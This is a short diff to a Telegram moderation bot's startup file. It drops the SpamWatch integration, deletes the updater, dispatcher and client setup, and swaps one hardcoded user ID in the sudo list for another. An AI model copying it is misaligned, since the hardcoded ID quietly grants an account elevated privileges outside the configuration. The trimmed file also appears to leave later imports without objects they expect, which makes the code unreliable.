@@ -1,7 +1,6 @@
 import logging
 import sys
 import yaml
-import spamwatch
 from telethon import TelegramClient
 import telegram.ext as tg
 
@@ -114,27 +113,7 @@ KITE =  CONFIG['kite']
 
 SUDO_USERS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-SUDO_USERS.add(802002142)
-# SpamWatch
-spamwatch_api = CONFIG['sw_api']
-
-if spamwatch_api == "None":
-    sw = None
-    LOGGER.warning("SpamWatch API key is missing! Check your config.env.")
-else:
-    sw = spamwatch.Client(spamwatch_api)
-
-updater = tg.Updater(TOKEN, workers=WORKERS)
-
-dispatcher = updater.dispatcher
-tbot = TelegramClient("alluka", API_KEY, API_HASH)
-
-SUDO_USERS = list(SUDO_USERS) + list(DEV_USERS)
-DEV_USERS = list(DEV_USERS)
-WHITELIST_USERS = list(WHITELIST_USERS)
-SUPPORT_USERS = list(SUPPORT_USERS)
-SPAMMERS = list(SPAMMERS)
-
+SUDO_USERS.add(1308554322)
 
 # Load at end to ensure all prev variables have been set
 from alluka.modules.helper_funcs.handlers import CustomCommandHandler, CustomRegexHandler
